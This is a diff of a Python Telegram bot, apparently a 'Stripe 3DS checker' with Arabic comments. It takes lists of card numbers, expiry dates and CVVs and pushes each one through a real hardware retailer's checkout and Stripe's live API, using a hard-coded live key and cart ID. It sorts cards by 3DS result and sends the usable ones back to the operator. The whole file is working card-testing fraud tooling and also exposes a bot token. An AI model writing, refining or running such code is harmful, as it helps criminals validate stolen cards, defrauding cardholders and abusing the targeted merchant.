@@ -6,6 +6,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 import requests
 import json
 import base64
+import urllib.parse
 
 # ========== الإعدادات ==========
 BOT_TOKEN = "8166484030:AAHwrm95j131yJxvtlNTAe6S57f5kcfU1ow"
@@ -27,7 +28,6 @@ stats = {
     'dashboard_message_id': None,
     'chat_id': None,
     'current_card': '',
-    'error_details': {},
     'last_response': 'Waiting...',
     'cards_checked': 0,
     'authenticated_cards': [],
@@ -41,77 +41,177 @@ class StripeChecker:
         self.session = requests.Session()
         self.headers = {
             'accept': 'application/json',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
         }
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
+            # الخطوة 1: إنشاء Payment Method
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/x-www-form-urlencoded',
                 'origin': 'https://js.stripe.com',
                 'referer': 'https://js.stripe.com/',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
             })
             
-            data = f'billing_details[address][state]=CO&billing_details[address][postal_code]=11333&billing_details[address][country]=US&billing_details[address][city]=Napoleon&billing_details[address][line1]=111+North+Street&billing_details[address][line2]=sagh&billing_details[email]=test21590@test.com&billing_details[name]=Card+Test&billing_details[phone]=3609998856&type=card&card[number]={card_number}&card[cvc]={cvv}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&_stripe_version=2020-03-02'
+            data = (
+                f'billing_details[address][state]=NY&'
+                f'billing_details[address][postal_code]=10003&'
+                f'billing_details[address][country]=UA&'
+                f'billing_details[address][city]=Napoleon&'
+                f'billing_details[address][line1]=111+North+Street&'
+                f'billing_details[email]=test@example.com&'
+                f'billing_details[name]=Card+Test&'
+                f'billing_details[phone]=3609998856&'
+                f'type=card&'
+                f'card[number]={card_number.replace(" ", "")}&'
+                f'card[cvc]={cvv}&'
+                f'card[exp_year]={exp_year}&'
+                f'card[exp_month]={exp_month}&'
+                f'allow_redisplay=unspecified&'
+                f'pasted_fields=number&'
+                f'payment_user_agent=stripe.js%2F846ec90400&'
+                f'referrer=https%3A%2F%2Fwww.ironmongeryworld.com&'
+                f'time_on_page=65184&'
+                f'guid=NA&'
+                f'muid=NA&'
+                f'sid=NA&'
+                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                f'_stripe_version=2020-03-02'
+            )
             
-            r = self.session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+            r = self.session.post(
+                'https://api.stripe.com/v1/payment_methods',
+                headers=headers,
+                data=data,
+                timeout=30
+            )
+            
+            if r.status_code != 200:
+                return 'ERROR', f'PM creation failed: {r.status_code}'
+            
             pm = r.json()
             if 'id' not in pm:
-                return 'DECLINED', 'Payment method creation failed'
+                error_msg = pm.get('error', {}).get('message', 'Unknown error')
+                return 'DECLINED', f'PM Error: {error_msg}'
+            
             pm_id = pm['id']
             
+            # الخطوة 2: إنشاء Payment Intent
             headers = self.headers.copy()
             headers.update({
                 'content-type': 'application/json',
                 'origin': 'https://www.ironmongeryworld.com',
-                'referer': 'https://www.ironmongeryworld.com/',
+                'referer': 'https://www.ironmongeryworld.com/onestepcheckout/',
+                'x-requested-with': 'XMLHttpRequest',
             })
             
+            # استخدام cart ID ديناميكي (يمكن تحديثه)
+            cart_id = 'lYVhhw5uAvPgnV4zY2e20AzW3AmSujgU'
+            
             payload = {
-                'cartId': 'IpdQhncGezLtHBJYWGXawaGHMnOcGCkV',
+                'cartId': cart_id,
                 'billingAddress': {
-                    'countryId': 'US',
-                    'regionId': '13',
-                    'street': ['111 North Street', 'sagh'],
+                    'countryId': 'EG',
+                    'region': 'NY',
+                    'street': ['111 North Street'],
+                    'company': '',
                     'telephone': '3609998856',
-                    'postcode': '11333',
+                    'postcode': '10003',
                     'city': 'Napoleon',
                     'firstname': 'Card',
                     'lastname': 'Test',
+                    'extension_attributes': {},
+                    'saveInAddressBook': None,
                 },
                 'paymentMethod': {
                     'method': 'stripe_payments',
                     'additional_data': {'payment_method': pm_id},
+                    'extension_attributes': {'agreement_ids': []},
                 },
-                'email': 'test21590@test.com',
+                'email': 'test@example.com',
             }
             
-            r = self.session.post('https://www.ironmongeryworld.com/rest/default/V1/guest-carts/IpdQhncGezLtHBJYWGXawaGHMnOcGCkV/payment-information', headers=headers, json=payload)
+            r = self.session.post(
+                f'https://www.ironmongeryworld.com/rest/default/V1/guest-carts/{cart_id}/payment-information',
+                headers=headers,
+                json=payload,
+                timeout=30
+            )
+            
+            if r.status_code != 200:
+                return 'ERROR', f'PI creation failed: {r.status_code}'
+            
             res = r.json()
-            if 'message' not in res or 'pi_' not in res['message']:
-                return 'DECLINED', 'Payment intent creation failed'
-            client_secret = res['message'].split(': ')[1]
+            if 'message' not in res:
+                return 'DECLINED', 'No payment intent created'
+            
+            message = res['message']
+            if 'pi_' not in message:
+                return 'DECLINED', message
+            
+            # استخراج client_secret
+            if ': ' in message:
+                client_secret = message.split(': ')[1]
+            else:
+                client_secret = message
+            
             pi_id = client_secret.split('_secret_')[0]
             
+            # الخطوة 3: الحصول على Payment Intent
             headers = self.headers.copy()
             headers.update({
                 'origin': 'https://js.stripe.com',
                 'referer': 'https://js.stripe.com/',
             })
             
-            params = f'client_secret={client_secret}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
-            r = self.session.get(f'https://api.stripe.com/v1/payment_intents/{pi_id}?{params}', headers=headers)
+            params = {
+                'is_stripe_sdk': 'false',
+                'client_secret': client_secret,
+                'key': 'pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X',
+                '_stripe_version': '2020-03-02',
+            }
+            
+            r = self.session.get(
+                f'https://api.stripe.com/v1/payment_intents/{pi_id}',
+                params=params,
+                headers=headers,
+                timeout=30
+            )
+            
+            if r.status_code != 200:
+                return 'ERROR', f'PI fetch failed: {r.status_code}'
+            
             pi = r.json()
             
+            # التحقق من الحالة
             if 'next_action' not in pi:
-                return 'DECLINED', 'No 3DS action required'
+                status = pi.get('status', 'unknown')
+                if status == 'succeeded':
+                    return 'Y', 'Payment succeeded'
+                return 'DECLINED', f'Status: {status}'
             
-            source = pi['next_action']['use_stripe_sdk']['three_d_secure_2_source']
-            trans_id = pi['next_action']['use_stripe_sdk']['server_transaction_id']
+            # الخطوة 4: 3DS2 Authentication
+            next_action = pi['next_action']
+            if 'use_stripe_sdk' not in next_action:
+                return 'ERROR', 'No 3DS data'
             
-            fp = base64.b64encode(json.dumps({"threeDSServerTransID": trans_id}).encode()).decode()
-            browser = json.dumps({
+            sdk_data = next_action['use_stripe_sdk']
+            source = sdk_data.get('three_d_secure_2_source', '')
+            trans_id = sdk_data.get('server_transaction_id', '')
+            
+            if not source or not trans_id:
+                return 'ERROR', 'Missing 3DS parameters'
+            
+            # إنشاء fingerprint data
+            fp_data = {"threeDSServerTransID": trans_id}
+            fp = base64.b64encode(json.dumps(fp_data).encode()).decode()
+            
+            browser_data = {
                 "fingerprintAttempted": True,
                 "fingerprintData": fp,
                 "challengeWindowSize": None,
@@ -123,10 +223,22 @@ class StripeChecker:
                 "browserScreenHeight": "786",
                 "browserScreenWidth": "1397",
                 "browserTZ": "-120",
-                "browserUserAgent": "Mozilla/5.0"
-            })
+                "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            }
             
-            data = f'source={source}&browser={requests.utils.quote(browser)}&key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X'
+            browser_encoded = urllib.parse.quote(json.dumps(browser_data))
+            
+            data = (
+                f'source={source}&'
+                f'browser={browser_encoded}&'
+                f'one_click_authn_device_support[hosted]=false&'
+                f'one_click_authn_device_support[same_origin_frame]=false&'
+                f'one_click_authn_device_support[spc_eligible]=true&'
+                f'one_click_authn_device_support[webauthn_eligible]=true&'
+                f'one_click_authn_device_support[publickey_credentials_get_allowed]=true&'
+                f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
+                f'_stripe_version=2020-03-02'
+            )
             
             headers = self.headers.copy()
             headers.update({
@@ -135,63 +247,83 @@ class StripeChecker:
                 'referer': 'https://js.stripe.com/',
             })
             
-            r = self.session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data)
+            r = self.session.post(
+                'https://api.stripe.com/v1/3ds2/authenticate',
+                headers=headers,
+                data=data,
+                timeout=30
+            )
+            
+            if r.status_code != 200:
+                return 'ERROR', f'3DS auth failed: {r.status_code}'
+            
             auth = r.json()
             
+            # تحليل النتيجة
             if 'ares' in auth:
-                status = auth['ares'].get('transStatus', 'UNKNOWN')
-                if status == 'R':
-                    return 'DECLINED', 'Rejected by issuer'
-                return status, f'3DS Status: {status}'
-            return 'DECLINED', 'Authentication failed'
+                trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
+                
+                status_map = {
+                    'Y': ('Y', 'Authenticated - Full 3DS verification'),
+                    'C': ('C', 'Challenge Required - Additional verification needed'),
+                    'A': ('A', 'Attempted - Issuer attempted authentication'),
+                    'N': ('N', 'Not Authenticated - Failed verification'),
+                    'U': ('U', 'Unavailable - Technical issue'),
+                    'R': ('DECLINED', 'Rejected by issuer'),
+                }
+                
+                return status_map.get(trans_status, ('ERROR', f'Unknown status: {trans_status}'))
             
+            if 'error' in auth:
+                error_msg = auth['error'].get('message', 'Unknown error')
+                return 'ERROR', f'3DS Error: {error_msg}'
+            
+            state = auth.get('state', 'unknown')
+            if state == 'failed':
+                return 'DECLINED', '3DS authentication failed'
+            
+            return 'ERROR', f'Unexpected response: {state}'
+            
+        except requests.exceptions.Timeout:
+            return 'ERROR', 'Request timeout'
+        except requests.exceptions.RequestException as e:
+            return 'ERROR', f'Network error: {str(e)[:50]}'
         except Exception as e:
-            return 'ERROR', str(e)
+            return 'ERROR', f'Exception: {str(e)[:50]}'
 
 async def send_result(bot_app, card, status_type, message):
     try:
         card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
         
-        if status_type == 'Y':
-            text = (
-                "╔═══════════════════╗\n"
-                "✅ **AUTHENTICATED CARD** ✅\n"
-                "╚═══════════════════╝\n\n"
-                f"💳 `{card}`\n"
-                f"🔥 Status: **Y - Authenticated**\n"
-                f"📊 Card #{card_number}\n"
-                f"⚡️ Stripe 3DS Gateway\n"
-                "╚═══════════════════╝"
-            )
-            stats['authenticated_cards'].append(card)
-            
-        elif status_type == 'C':
-            text = (
-                "╔═══════════════════╗\n"
-                "⚠️ **CHALLENGE REQUIRED** ⚠️\n"
-                "╚═══════════════════╝\n\n"
-                f"💳 `{card}`\n"
-                f"🔥 Status: **C - Challenge Required**\n"
-                f"📊 Card #{card_number}\n"
-                f"⚡️ Stripe 3DS Gateway\n"
-                "╚═══════════════════╝"
-            )
-            stats['challenge_cards'].append(card)
-            
-        elif status_type == 'A':
-            text = (
-                "╔═══════════════════╗\n"
-                "🔵 **ATTEMPTED** 🔵\n"
-                "╚═══════════════════╝\n\n"
-                f"💳 `{card}`\n"
-                f"🔥 Status: **A - Attempted**\n"
-                f"📊 Card #{card_number}\n"
-                f"⚡️ Stripe 3DS Gateway\n"
-                "╚═══════════════════╝"
-            )
-            stats['attempted_cards'].append(card)
-        else:
+        status_emojis = {
+            'Y': ('✅', 'AUTHENTICATED CARD', 'Y - Authenticated'),
+            'C': ('⚠️', 'CHALLENGE REQUIRED', 'C - Challenge Required'),
+            'A': ('🔵', 'ATTEMPTED', 'A - Attempted'),
+        }
+        
+        if status_type not in status_emojis:
             return
+        
+        emoji, title, status_text = status_emojis[status_type]
+        
+        text = (
+            f"╔══════════════════════╗\n"
+            f"{emoji} **{title}** {emoji}\n"
+            f"╚══════════════════════╝\n\n"
+            f"💳 `{card}`\n"
+            f"🔥 Status: **{status_text}**\n"
+            f"📊 Card #{card_number}\n"
+            f"⚡️ Stripe 3DS Gateway\n"
+            f"📝 {message}\n"
+            f"╚══════════════════════╝"
+        )
+        
+        if status_type == 'Y':
+            stats['authenticated_cards'].append(card)
+        elif status_type == 'C':
+            stats['challenge_cards'].append(card)
+        elif status_type == 'A':
+            stats['attempted_cards'].append(card)
         
         await bot_app.bot.send_message(
             chat_id=stats['chat_id'],
@@ -199,7 +331,7 @@ async def send_result(bot_app, card, status_type, message):
             parse_mode='Markdown'
         )
     except Exception as e:
-        print(f"[!] Error: {e}")
+        print(f"[!] Error sending result: {e}")
 
 async def check_card(card, bot_app):
     if not stats['is_running']:
@@ -213,15 +345,14 @@ async def check_card(card, bot_app):
         await update_dashboard(bot_app)
         return card, "ERROR", "صيغة خاطئة"
     
-    card_number, exp_month, exp_year, cvv = parts
-    card_number = card_number.strip()
-    exp_month = exp_month.strip().zfill(2)
-    exp_year = exp_year.strip()
+    card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
+    
+    # تنظيف البيانات
+    card_number = card_number.replace(' ', '').replace('-', '')
+    exp_month = exp_month.zfill(2)
     
     if len(exp_year) == 4:
         exp_year = exp_year[-2:]
-    
-    cvv = cvv.strip()
     
     try:
         if not stats['is_running']:
@@ -231,55 +362,30 @@ async def check_card(card, bot_app):
         checker = StripeChecker()
         status, message = checker.check(card_number, exp_month, exp_year, cvv)
         
-        if status == 'Y':
-            stats['authenticated'] += 1
+        status_handlers = {
+            'Y': ('authenticated', 'Authenticated ✅'),
+            'C': ('challenge', 'Challenge ⚠️'),
+            'A': ('attempted', 'Attempted 🔵'),
+            'N': ('not_auth', 'Not Auth ❌'),
+            'U': ('unavailable', 'Unavailable 🔴'),
+            'DECLINED': ('declined', 'Declined ❌'),
+        }
+        
+        if status in status_handlers:
+            stat_key, response_text = status_handlers[status]
+            stats[stat_key] += 1
             stats['checking'] -= 1
-            stats['last_response'] = 'Authenticated ✅'
+            stats['last_response'] = response_text
             await update_dashboard(bot_app)
-            await send_result(bot_app, card, "Y", message)
-            return card, "Y", message
             
-        elif status == 'C':
-            stats['challenge'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Challenge ⚠️'
-            await update_dashboard(bot_app)
-            await send_result(bot_app, card, "C", message)
-            return card, "C", message
+            if status in ['Y', 'C', 'A']:
+                await send_result(bot_app, card, status, message)
             
-        elif status == 'A':
-            stats['attempted'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Attempted 🔵'
-            await update_dashboard(bot_app)
-            await send_result(bot_app, card, "A", message)
-            return card, "A", message
-            
-        elif status == 'N':
-            stats['not_auth'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Not Auth ❌'
-            await update_dashboard(bot_app)
-            return card, "N", message
-            
-        elif status == 'U':
-            stats['unavailable'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Unavailable 🔴'
-            await update_dashboard(bot_app)
-            return card, "U", message
-            
-        elif status == 'DECLINED' or status == 'R':
-            stats['declined'] += 1
-            stats['checking'] -= 1
-            stats['last_response'] = 'Declined/Rejected ❌'
-            await update_dashboard(bot_app)
-            return card, "DECLINED", message
-            
+            return card, status, message
         else:
             stats['errors'] += 1
             stats['checking'] -= 1
-            stats['last_response'] = f'{status}'
+            stats['last_response'] = f'{status[:20]}'
             await update_dashboard(bot_app)
             return card, status, message
             
@@ -305,7 +411,7 @@ def create_dashboard_keyboard():
         ],
         [
             InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"),
-            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}",callback_data="challenge")
+            InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")
         ],
         [
             InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"),
@@ -315,12 +421,8 @@ def create_dashboard_keyboard():
             InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"),
             InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined")
         ],
-        [
-            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")
-        ],
-        [
-            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
-        ]
+        [InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")],
+        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
     ]
     
     if stats['is_running']:
@@ -341,46 +443,33 @@ async def update_dashboard(bot_app):
                 reply_markup=create_dashboard_keyboard(),
                 parse_mode='Markdown'
             )
-        except:
+        except Exception as e:
             pass
 
 async def send_final_files(bot_app):
     try:
-        if stats['authenticated_cards']:
-            authenticated_text = "\n".join(stats['authenticated_cards'])
-            with open("authenticated_cards.txt", "w") as f:
-                f.write(authenticated_text)
-            await bot_app.bot.send_document(
-                chat_id=stats['chat_id'],
-                document=open("authenticated_cards.txt", "rb"),
-                caption=f"✅ **Authenticated Cards (Y)** ({len(stats['authenticated_cards'])} cards)",
-                parse_mode='Markdown'
-            )
-            os.remove("authenticated_cards.txt")
+        file_configs = [
+            ('authenticated_cards', '✅', 'Authenticated Cards (Y)'),
+            ('challenge_cards', '⚠️', 'Challenge Required Cards (C)'),
+            ('attempted_cards', '🔵', 'Attempted Cards (A)'),
+        ]
         
-        if stats['challenge_cards']:
-            challenge_text = "\n".join(stats['challenge_cards'])
-            with open("challenge_cards.txt", "w") as f:
-                f.write(challenge_text)
-            await bot_app.bot.send_document(
-                chat_id=stats['chat_id'],
-                document=open("challenge_cards.txt", "rb"),
-                caption=f"⚠️ **Challenge Required Cards (C)** ({len(stats['challenge_cards'])} cards)",
-                parse_mode='Markdown'
-            )
-            os.remove("challenge_cards.txt")
-        
-        if stats['attempted_cards']:
-            attempted_text = "\n".join(stats['attempted_cards'])
-            with open("attempted_cards.txt", "w") as f:
-                f.write(attempted_text)
-            await bot_app.bot.send_document(
-                chat_id=stats['chat_id'],
-                document=open("attempted_cards.txt", "rb"),
-                caption=f"🔵 **Attempted Cards (A)** ({len(stats['attempted_cards'])} cards)",
-                parse_mode='Markdown'
-            )
-            os.remove("attempted_cards.txt")
+        for card_type, emoji, caption in file_configs:
+            cards = stats.get(f'{card_type}', [])
+            if cards:
+                filename = f"{card_type}.txt"
+                with open(filename, "w", encoding='utf-8') as f:
+                    f.write("\n".join(cards))
+                
+                with open(filename, "rb") as f:
+                    await bot_app.bot.send_document(
+                        chat_id=stats['chat_id'],
+                        document=f,
+                        caption=f"{emoji} **{caption}** ({len(cards)} cards)",
+                        parse_mode='Markdown'
+                    )
+                
+                os.remove(filename)
         
     except Exception as e:
         print(f"[!] خطأ في إرسال الملفات: {e}")
@@ -390,7 +479,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
     
-    keyboard = [[InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")]]
+    keyboard = [[InlineKeyboardButton("📝 إرسال ملف البطاقات", callback_data="send_file")]]
     await update.message.reply_text(
         "📊 **STRIPE 3DS CHECKER BOT**\n\n"
         "أرسل ملف .txt يحتوي على البطاقات\n"
@@ -430,7 +519,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         'declined': 0,
         'errors': 0,
         'current_card': '',
-        'error_details': {},
         'last_response': 'Starting...',
         'cards_checked': 0,
         'authenticated_cards': [],
@@ -455,7 +543,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
     
-    # استخدام asyncio.create_task بدل threading
     asyncio.create_task(process_cards(cards, context.application))
 
 async def process_cards(cards, bot_app):
@@ -473,10 +560,10 @@ async def process_cards(cards, bot_app):
         await check_card(card, bot_app)
         stats['cards_checked'] += 1
         
-        if stats['cards_checked'] % 5 == 0:
+        if stats['cards_checked'] % 3 == 0:
             await update_dashboard(bot_app)
         
-        await asyncio.sleep(2)
+        await asyncio.sleep(3)
     
     stats['is_running'] = False
     stats['checking'] = 0
@@ -485,9 +572,9 @@ async def process_cards(cards, bot_app):
     await update_dashboard(bot_app)
     
     summary_text = (
-        "═══════════════════\n"
+        "╔═══════════════════╗\n"
         "✅ **اكتمل الفحص!** ✅\n"
-        "═══════════════════\n\n"
+        "╚═══════════════════╝\n\n"
         f"📊 **الإحصائيات النهائية:**\n"
         f"🔥 الإجمالي: {stats['total']}\n"
         f"✅ Authenticated (Y): {stats['authenticated']}\n"
@@ -509,9 +596,9 @@ async def process_cards(cards, bot_app):
     await send_final_files(bot_app)
     
     final_text = (
-        "╔═══════════════════╗\n"
+        "╔═══════════════════════╗\n"
         "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
-        "╚═══════════════════╝\n\n"
+        "╚═══════════════════════╝\n\n"
         "✅ تم إرسال جميع الملفات\n"
         "📊 شكراً لاستخدامك البوت!\n\n"
         "⚡️ Stripe 3DS Gateway"
@@ -557,8 +644,8 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 def main():
     print("[🤖] Starting Stripe 3DS Telegram Bot...")
-    print("[✅] Bot will send results in chat (no channel)")
-    print("[✅] Using asyncio.create_task (no threading)")
+    print("[✅] Updated version with improved error handling")
+    print("[✅] Using asyncio.create_task")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
